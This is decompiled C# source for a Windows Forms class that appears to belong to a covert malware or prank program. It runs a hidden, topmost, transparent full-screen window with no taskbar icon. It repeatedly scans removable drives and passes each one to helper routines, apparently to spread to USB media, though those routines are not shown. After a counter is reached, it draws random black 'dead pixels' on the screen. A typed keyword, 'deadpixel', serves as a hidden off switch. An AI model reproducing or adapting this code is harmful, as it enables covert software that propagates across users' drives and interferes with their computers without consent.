using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

[DesignerGenerated]
public class Form1 : Form
{
	private static ArrayList arrayList_0 = new ArrayList();

	private IContainer icontainer_0;

	private Timer timer_0;

	private GClass0 gclass0_0;

	private Timer timer_1;

	private Timer timer_2;

	private Random random_0;

	private Bitmap bitmap_0;

	private string string_0;

	private string string_1;

	public Form1()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0060: Unknown result type (might be due to invalid IL or missing references)
		//IL_006a: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).add_KeyPress(new KeyPressEventHandler(Form1_KeyPress));
		lock (arrayList_0)
		{
			arrayList_0.Add(new WeakReference(this));
		}
		random_0 = new Random();
		bitmap_0 = new Bitmap(1, 1);
		string_0 = "";
		string_1 = "deadpixel";
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	void Form.Dispose(bool disposing)
	{
		if ((disposing && icontainer_0 != null) ? true : false)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0038: Expected O, but got Unknown
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0049: Expected O, but got Unknown
		icontainer_0 = new Container();
		vmethod_1(new Timer(icontainer_0));
		vmethod_3(new GClass0());
		vmethod_5(new Timer(icontainer_0));
		vmethod_7(new Timer(icontainer_0));
		((Control)this).SuspendLayout();
		vmethod_0().set_Interval(1000);
		((Control)vmethod_2()).set_Anchor((AnchorStyles)15);
		((Control)vmethod_2()).set_BackColor(Color.DimGray);
		GClass0 gClass = vmethod_2();
		Point location = new Point(0, 0);
		((Control)gClass).set_Location(location);
		((Control)vmethod_2()).set_Name("BufferedPanel1");
		GClass0 gClass2 = vmethod_2();
		Size size = new Size(292, 266);
		((Control)gClass2).set_Size(size);
		((Control)vmethod_2()).set_TabIndex(0);
		vmethod_4().set_Enabled(true);
		vmethod_4().set_Interval(200);
		vmethod_6().set_Enabled(true);
		vmethod_6().set_Interval(15000);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.DimGray);
		size = new Size(292, 266);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)vmethod_2());
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_KeyPreview(true);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)0);
		((Form)this).set_TopMost(true);
		((Form)this).set_TransparencyKey(Color.DimGray);
		((Control)this).ResumeLayout(false);
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Timer vmethod_0()
	{
		return timer_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_1(Timer timer_3)
	{
		if (timer_0 != null)
		{
			timer_0.remove_Tick((EventHandler)timer_0_Tick);
		}
		timer_0 = timer_3;
		if (timer_0 != null)
		{
			timer_0.add_Tick((EventHandler)timer_0_Tick);
		}
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual GClass0 vmethod_2()
	{
		return gclass0_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_3(GClass0 gclass0_1)
	{
		gclass0_0 = gclass0_1;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Timer vmethod_4()
	{
		return timer_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_5(Timer timer_3)
	{
		if (timer_1 != null)
		{
			timer_1.remove_Tick((EventHandler)timer_1_Tick);
		}
		timer_1 = timer_3;
		if (timer_1 != null)
		{
			timer_1.add_Tick((EventHandler)timer_1_Tick);
		}
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Timer vmethod_6()
	{
		return timer_2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_7(Timer timer_3)
	{
		if (timer_2 != null)
		{
			timer_2.remove_Tick((EventHandler)timer_2_Tick);
		}
		timer_2 = timer_3;
		if (timer_2 != null)
		{
			timer_2.add_Tick((EventHandler)timer_2_Tick);
		}
	}

	private void Form1_KeyPress(object sender, KeyPressEventArgs e)
	{
		string_0 += Conversions.ToString(e.get_KeyChar());
		method_0();
	}

	private void method_0()
	{
		if (Operators.CompareString(string_0.ToLower(), string_1.Substring(0, string_0.Length), false) != 0)
		{
			string_0 = "";
		}
		else if (string_0.Length == string_1.Length)
		{
			string_0 = "";
			((Component)(object)this).Dispose();
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		GClass1.smethod_2();
		try
		{
			foreach (DriveInfo drife in ((ServerComputer)Class1.smethod_0()).get_FileSystem().get_Drives())
			{
				try
				{
					if (drife.DriveType == DriveType.Removable && drife.IsReady)
					{
						GClass1.smethod_4(drife.RootDirectory.FullName.ToString());
					}
				}
				catch (IOException projectError)
				{
					ProjectData.SetProjectError((Exception)projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		GClass1.smethod_6();
		((Control)this).set_Height(((Computer)Class1.smethod_0()).get_Screen().get_Bounds().Height);
		((Control)this).set_Width(((Computer)Class1.smethod_0()).get_Screen().get_Bounds().Width);
		bitmap_0.SetPixel(0, 0, Color.Black);
		vmethod_0().set_Enabled(false);
	}

	public int method_1(int int_0, int int_1)
	{
		return random_0.Next(int_0, int_1);
	}

	private void timer_0_Tick(object sender, EventArgs e)
	{
		Graphics val = ((Control)vmethod_2()).CreateGraphics();
		val.DrawImageUnscaled((Image)(object)bitmap_0, method_1(0, ((Control)this).get_Width()), method_1(0, ((Control)this).get_Height()));
	}

	private void timer_1_Tick(object sender, EventArgs e)
	{
		((Control)this).BringToFront();
	}

	private void timer_2_Tick(object sender, EventArgs e)
	{
		try
		{
			if ((GClass1.long_0 >= 100L) & !vmethod_0().get_Enabled())
			{
				vmethod_0().set_Enabled(true);
				vmethod_0().Start();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		foreach (DriveInfo drife in ((ServerComputer)Class1.smethod_0()).get_FileSystem().get_Drives())
		{
			try
			{
				if (drife.DriveType == DriveType.Removable && drife.IsReady)
				{
					GClass1.smethod_4(drife.RootDirectory.FullName.ToString());
				}
			}
			catch (IOException projectError2)
			{
				ProjectData.SetProjectError((Exception)projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}
}
